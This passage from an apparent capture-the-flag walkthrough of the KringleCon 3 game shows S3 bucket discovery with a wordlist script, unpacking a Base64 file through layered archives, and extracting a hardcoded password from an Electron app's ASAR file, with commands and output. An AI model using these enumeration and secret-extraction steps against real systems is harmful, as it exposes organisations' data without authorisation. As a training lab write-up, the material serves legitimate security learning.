    <img data-src="/images/kringlecon3/objectives/obj2_01.webp" alt="Objective 2 description" data-caption="Objective 2 description" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Objective 2 description
      
        
        
      
    </figcaption>
  
</figure>
<p>The terminal to investigate the <em>S3 Bucket</em> is next to <strong>Shinny Upatree</strong> in the <em>Castle Approach</em> area:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj2_02.webp" alt="Objective 2 location" data-caption="Objective 2 location" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Objective 2 location
      
        
        
      
    </figcaption>
  
</figure>
<p>We access a terminal where we need to retrieve a file in a lost <em>AWS S3 Bucket</em>:</p>
<div class="box"><p>Can you help me? Santa has been experimenting with new wrapping technology, and we&rsquo;ve run into a ribbon-curling nightmare! We store our essential data assets in the cloud, and what a joy it&rsquo;s been! Except I don&rsquo;t remember where, and the <strong>Wrapper3000</strong> is on the fritz! Can you find the missing package, and unwrap it all the way?</p>
<p>Hints: Use the file command to identify a file type. You can also examine tool help using the man command. Search all man pages for a string such as a file extension using the apropos command.</p>
</div>
<p>We find a <code>bucket_finder.rb</code> script in our home folder with a short <code>wordlist</code> file:</p>
<div class="box">kringlecastle<br />
wrapper<br />
santa</div>
<p>This is a <em>Ruby</em> script that can be used to discover unprotected buckets based on a custom wordlist. Its usage is pretty simple:</p>
<div class="box"><p>$ ./bucket_finder.rb wordlist</p>
<p><a href="http://s3.amazonaws.com/kringlecastle">http://s3.amazonaws.com/kringlecastle</a><br />
Bucket found but access denied: kringlecastle<br />
<a href="http://s3.amazonaws.com/wrapper">http://s3.amazonaws.com/wrapper</a><br />
Bucket found but access denied: wrapper<br />
<a href="http://s3.amazonaws.com/santa">http://s3.amazonaws.com/santa</a><br />
Bucket santa redirects to: santa.s3.amazonaws.comhttp://santa.s3.amazonaws.com/<br />
Bucket found but access denied: santa</p>
</div>
<p>The default wordlist does not discover anything interesting. Let&rsquo;s add some more words based on what we know so far:</p>
<div class="box">package<br />
wrapper3000</div>
<p>The same command shows now a hit for <code>wrapper3000</code> and shows it contains a file called <code>package</code>:</p>
<div class="box"><p>$ ./bucket_finder.rb wordlist</p>
<p><a href="http://s3.amazonaws.com/package">http://s3.amazonaws.com/package</a><br />
Bucket found but access denied: package<br />
<a href="http://s3.amazonaws.com/wrapper3000">http://s3.amazonaws.com/wrapper3000</a><br />
Bucket Found: wrapper3000 ( <a href="http://s3.amazonaws.com/wrapper3000">http://s3.amazonaws.com/wrapper3000</a> )         <br />
<Public> <a href="http://s3.amazonaws.com/wrapper3000/package">http://s3.amazonaws.com/wrapper3000/package</a></p>
</div>
<p>We can download it with:</p>
<div class="box">$ ./bucket_finder.rb &ndash;download wordlist</div>
<p>A folder <code>wrapper3000</code> is created that contains the <code>package</code> file:</p>
<div class="box"><p>$ cat package</p>
<p>UEsDBAoAAAAAAIAwhFEbRT8anwEAAJ8BAAAcABwAcGFja2FnZS50eHQuWi54ei54eGQudGFyLmJ6MlVUCQADoBfKX6AXyl91eAsAAQT2AQAABBQAAABCWmg5MUFZJlNZ2ktivwABHv+Q3hASgGSn//AvBxDwf/xe0gQAAAgwAVmkYRTKe1PVM9U0ekMg2poAAAGgPUPUGqehhCMSgaBoAD1NNAAAAyEmJpR5QGg0bSPU/VA0eo9IaHqBkxw2YZK2NUASOegDIzwMXMHBCFACgIEvQ2Jrg8V50tDjh61Pt3Q8CmgpFFunc1Ipui+SqsYB04M/gWKKc0Vs2DXkzeJmiktINqjo3JjKAA4dLgLtPN15oADLe80tnfLGXhIWaJMiEeSX992uxodRJ6EAzIFzqSbWtnNqCTEDML9AK7HHSzyyBYKwCFBVJh17T636a6YgyjX0eE0IsCbjcBkRPgkKz6q0okb1sWicMaky2Mgsqw2nUm5ayPHUeIktnBIvkiUWxYEiRs5nFOM8MTk8SitV7lcxOKst2QedSxZ851ceDQexsLsJ3C89Z/gQ6Xn6KBKqFsKyTkaqO+1FgmImtHKoJkMctd2B9JkcwvMr+hWIEcIQjAZGhSKYNPxHJFqJ3t32Vjgn/OGdQJiIHv4u5IpwoSG0lsV+UEsBAh4DCgAAAAAAgDCEURtFPxqfAQAAnwEAABwAGAAAAAAAAAAAAKSBAAAAAHBhY2thZ2UudHh0LloueHoueHhkLnRhci5iejJVVAUAA6AXyl91eAsAAQT2AQAABBQAAABQSwUGAAAAAAEAAQBiAAAA9QEAAAAA</p>
</div>
<p>This looks like <em>Base64</em> encoding. We can decode it with:</p>
<div class="box"><p>$ cat package | base64 -d</p>
<p>PK??��   package.txt.Z.xz.xxd.tar.bz2UT  ��_��_ux                                                   �BZh91AY&amp;SY�Kb�����d���/    ��^0Y�a�{S�3�4zC ښ �=C�?���#��h=M4!&amp;&amp;�y@h4m#��P4z�Hhz��6a��5@9�#&lt;                                                                  \�P��/Cbk��y�� ㇭O�t&lt;h)[�sR)�/���Ӄ?�b�sEl�5���f�KH6��ܘ�  .�&lt;�y��{�-���^h�&quot;  ��ݮƇQ'�́s�&amp;ֶsj   10�@+��K&lt;��PU&amp;{O��k� �5�x�&amp;�p &gt;���Z���x�/=g��y�(�²NF�;�E�b&amp;�r�&amp;C�݁���+��      ��F�&quot;�4�G$Z����V8'��@���.�p�!���~PK??��  ?��package.txt.Z.xz.xxd.tar.bz2UT��_ux                                               �PKb�elf@8d5e97ec58f3:~/bucket_fin</p>
</div>
<p>By looking at the first letters <code>PK</code>, we recognize the <em>ZIP</em> magic bytes! We can extract its content with:</p>
<div class="box">$ cat package | base64 -d &gt; package.zip &amp;&amp; unzip package.zip</div>
<p>We get a weird file called: <code>package.txt.Z.xz.xxd.tar.bz2</code>. It seems to have been compressed and manipulated a few times. We can further decompress the file with:</p>
<div class="box">$ bzip2 -d package.txt.Z.xz.xxd.tar.bz2<br />
$ tar xvf package.txt.Z.xz.xxd.tar</div>
<p>Now we have a <code>.xxd</code> file. <code>xxd</code> is a command that creates a hex dump from a file. If we look at the content of the file, we see it is precisely that and that the first 6 bytes <code>fd37 7a58 5a00</code> are the signature of the <code>xz</code> compression utility:</p>
<div class="box">$ cat package.txt.Z.xz.xxd<br />
00000000: fd37 7a58 5a00 0004 e6d6 b446 0200 2101  .7zXZ&hellip;&hellip;F..!.<br />
00000010: 1600 0000 742f e5a3 0100 2c1f 9d90 4ede  &hellip;.t/&hellip;.,&hellip;N.<br />
00000020: c8a1 8306 0494 376c cae8 0041 054d 1910  &hellip;&hellip;7l&hellip;A.M..<br />
00000030: 46e4 bc99 4327 4d19 8a06 d984 19f3 f08d  F&hellip;C&rsquo;M&hellip;&hellip;&hellip;<br />
00000040: 1b10 45c2 0c44 a300 0000 0000 c929 dad6  ..E..D&hellip;&hellip;.)..<br />
00000050: 64ef da24 0001 452d 1e52 57e8 1fb6 f37d  d..$..E-.RW&hellip;.}<br />
00000060: 0100 0000 0004 595a                      &hellip;&hellip;YZ</div>
<p>We can restore the <code>xz</code> archive and decompress it with:</p>
<div class="box">$ xxd -r package.txt.Z.xz.xxd | xz -d &gt; package.txt.Z</div>
<p>One last step! We decompress <code>.Z</code> file with the <code>uncompress</code> command and finally read the text file:</p>
<div class="box">$ uncompress package.txt.Z &amp;&amp; cat package.txt<br />
North Pole: The Frostiest Place on Earth</div>
<p>The overall process can be done with the following one-liner:</p>
<div class="box"><p>$ cat package | base64 -d | zcat | bzip2 -d | tar xOvf - | xxd -r | xz -d | uncompress</p>
<p>package.txt.Z.xz.xxd<br />
North Pole: The Frostiest Place on Earth</p>
</div>
<div class="notices success" data-title="Objective 2 answer">
  North Pole: The Frostiest Place on Earth
</div>
<h3 id="3---point-of-sale-passwordrecovery">3 - Point-of-Sale Password Recovery</h3>
<hr />
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj3_01.webp" alt="Objective 3 description" data-caption="Objective 3 description" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Objective 3 description
      
        
        
      
    </figcaption>
  
</figure>
<p>We enter the castle and meet <strong>Santa</strong> again:</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><p><strong>Santa:</strong><br />
Welcome to my newly upgraded castle!</p>
<p>Also, check out that big portrait behind me! I received it in the mail a couple of weeks ago - a wonderful house warming present from an anonymous admirer. Gosh, I wonder who sent it. I&rsquo;m so thankful for the gift!</p>
<p>Please feel free to explore my upgraded castle and enjoy the <em>KringleCon</em> talks upstairs. You can get there through my new <em>Santavator</em>!</p>
</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj3_08.webp" alt="Santa&#39;s present" data-caption="Santa&#39;s present" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Santa&#39;s present
      
        
        
      
    </figcaption>
  
</figure>
<p>One of the elves seems worried about <strong>Santa</strong>:</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><strong>Piney Sappington:</strong><br />
Psssst! Hey you! Yes YOU!<br />
I&rsquo;ve gotta tell you something, but you gotta keep it on the down-low. <strong>Santa</strong> has been behaving VERY strangely over the past couple of weeks. He has delayed certain projects, cancelled others, and even messed around with our technical infrastructure.<br />
There&rsquo;s rumors among the elves that something has gone wrong with <strong>Santa</strong>. I can&rsquo;t say any more - he might hear!</div>
<p>We continue to the <em>Courtyard</em>, through the <em>Dining Room</em> where we meet <strong>Jack Frost</strong> for the very first time:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj3_07.webp" alt="Jack Frost" data-caption="Jack Frost" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Jack Frost
      
        
        
      
    </figcaption>
  
</figure>
<p>He has a cryptic message for us:</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><strong>Jack Frost:</strong><br />
That&rsquo;s such a magnificent portrait of <strong>Santa</strong> in the foyer. What a great demonstration of artistic skill.<br />
Bwahahaha!</div>
<p>Next to him, we find <strong>Sugarplum Mary</strong> and the <em>Santa Shop</em>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj3_02.webp" alt="Objective 3 location" data-caption="Objective 3 location" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Objective 3 location
      
        
        
      
    </figcaption>
  
</figure>
<p>We can download an offline version of <em>Santa Shop</em> which comes as an installer file <code>santa-shop.exe</code>. As per the hints we got from the <a href="#2---linux-primer">Linux Primer</a> challenge, we know it is an <em>Electron</em> application and that the password we are looking for must be stored in an <a href="https://github.com/electron/asar">ASAR</a> file.</p>
<p><a href="https://www.electronjs.org">Electron</a> is an open-source framework that can be used to create cross-platform applications based on <em>JavaScript</em>, <em>HTML</em>, and <em>CSS</em>. An <em>ASAR</em> (<em>Atom Shell Archive Format</em>) file is a <em>TAR</em>-like archive that concatenates files into a single one. <em>Electron</em> can read it without unpacking it. It usually contains all the application files.</p>
<p>Let&rsquo;s install the application on a <em>Windows 10</em> box and launch it:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj3_03.webp" alt="Santa Point-of-Sale" data-caption="Santa Point-of-Sale" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Santa Point-of-Sale
      
        
        
      
    </figcaption>
  
</figure>
<p>The application is installed by default in the current user profile:</p>
<div class="box">C:\Users\%user%\AppData\Local\Programs\santa-shop</div>
<p>The <em>ASAR</em> file location is:</p>
<div class="box">C:\Users\%user%\AppData\Local\Programs\santa-shop\resources\app.asar</div>
<p>We can extract the contained files by following this <a href="https://medium.com/how-to-electron/how-to-get-source-code-of-any-electron-application-cbb5c7726c37">procedure</a>:</p>
<ol>
<li>install <a href="https://nodejs.org/en/download">Node.js</a> if not already done,</li>
<li>from the command line, run <code>npm install -g asar</code> to install the <code>asar</code> package,</li>
<li>go to the <code>resources</code> directory: <code>cd C:\Users\&lt;user&gt;\AppData\Local\Programs\santa-shop\resources</code>,</li>
<li>create a folder where the files will be extracted: <code>mkdir output</code>,</li>
<li>extract the files: <code>asar extract app.asar output</code>.</li>
</ol>
<p>We get the following files:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj3_04.webp" alt="Santa PoS application files" data-caption="Santa PoS application files" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Santa PoS application files
      
        
        
      
    </figcaption>
  
</figure>
<p>The password is found at the top of <code>main.js</code>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj3_05.webp" alt="main.js snippet" data-caption="main.js snippet" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      main.js snippet
      
        
        
      
    </figcaption>
  
</figure>
<p>We can now access the (dummy) <em>PoS</em>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj3_06.webp" alt="Santa PoS user interface" data-caption="Santa PoS user interface" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Santa PoS user interface
      
        
        
      
    </figcaption>
  
</figure>
<p>Alternatively, we can get the <em>ASAR</em> file without a <em>Windows</em> box. As the installer is a self-extracting archive:</p>
<div class="box">$ file santa-shop.exe<br />
santa-shop.exe: PE32 executable (GUI) Intel 80386, for MS Windows, Nullsoft Installer self-extracting archive</div>
<p>We can use tools like <em>7Zip</em> to extract its content:</p>
<div class="box">$ 7z x santa-shop.exe</div>
<p>We get the application uninstaller and a folder <code>$PLUGINSDIR</code> that contains some <em>DLLs</em> and another archive called <code>app-64.7z</code>. We can extract it to get the same files installed on <em>Windows</em>. The <em>ASAR</em> file is still in the <code>resources</code> folder.</p>
<div class="notices success" data-title="Objective 3 answer">
  santapass
</div>
<h3 id="4---operate-the-santavator">4 - Operate the Santavator</h3>
<hr />
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj4_01.webp" alt="Objective 4 description" data-caption="Objective 4 description" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Objective 4 description
      
        
        
      
    </figcaption>
  
</figure>
<p>The castle elevator seems buggy and needs some repair before we can use it.</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj4_02.webp" alt="Santavator location" data-caption="Santavator location" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Santavator location
      
        
        
      
    </figcaption>
  
</figure>
<p><strong>Sparkle Redberry</strong> gives us some information about it:</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><p><strong>Sparkle Redberry:</strong><br />
Hey hey, <strong>Sparkle Redberry</strong> here!<br />
The <em>Santavator</em> is on the fritz. Something with the wiring is grinchy, but maybe you can rig something up? Here&rsquo;s the key! Good luck!</p>
<p>On another note, I heard <strong>Santa</strong> say that he was thinking of canceling <em>KringleCon</em> this year! At first, I thought it was a joke, but he seemed serious. I&rsquo;m glad he changed his mind.</p>
<p>Have you had a chance to look at the <em>Santavator</em> yet? With that key, you can look under the panel and see the <em>Super Santavator Sparkle Stream</em> (<em>S4</em>). To get to different floors, you&rsquo;ll need to power the various colored receivers.</p>
<p>… There MAY be a way to bypass the <em>S4</em> stream.</p>
</div>
<p>We receive the <em>Elevator Service Key</em> and <strong>Ginger Breddle</strong> adds:</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><strong>Ginger Breddle:</strong><br />
Hey, I heard from some of the other elves that there&rsquo;s some really crazy things going on with floor one and a half.</div>
<p>Once in the <em>Santavator</em>, we can access the panel where we see a missing button. We can&rsquo;t go anywhere at the moment and this is shown by the buttons being all red:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj4_03.webp" alt="Santavator panel" data-caption="Santavator panel" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Santavator panel
      
        
        
      
    </figcaption>
  
</figure>
<p>If we open the panel, we see the <a href="#items">Items</a> we collected so far and a strange ray of light:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj4_04.webp" alt="Santavator panel interior" data-caption="Santavator panel interior" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Santavator panel interior
      
        
        
      
    </figcaption>
  
</figure>
<p>The items we have discovered so far are 2 <em>Hex Nuts</em>, the <em>Broken Candycane</em> and the <em>Green Bulb</em>. If we put the <em>Green Bulb</em> in the ray of light, the ray takes its color. With the help of the other items, we can divert the ray to hit the green bulb socket:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj4_05.webp" alt="Santavator panel interior - green light ray" data-caption="Santavator panel interior - green light ray" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Santavator panel interior - green light ray
      
        
        
      
    </figcaption>
  
</figure>
<p>The green power light is now <em>ON</em>, and this gives us access to the <em>Talks</em> floor and the <em>Lobby</em> (where we are) as we can see from the bottom right note. This means that we need to find the <em>Red Bulb</em> to access the <em>Workshop</em> floor and the <em>Roof</em> (<em>NetWars</em>). If we have the 3 bulbs, we can access <strong>Santa</strong>&rsquo;s office!</p>
<p>As soon as we access the <em>KringleCon Talks</em> floor, the <em>Objective</em> is validated. We meet then with <strong>Bow Ninecandle</strong> and again <strong>Jack Frost</strong>:</p>
<figure >
  
  
  
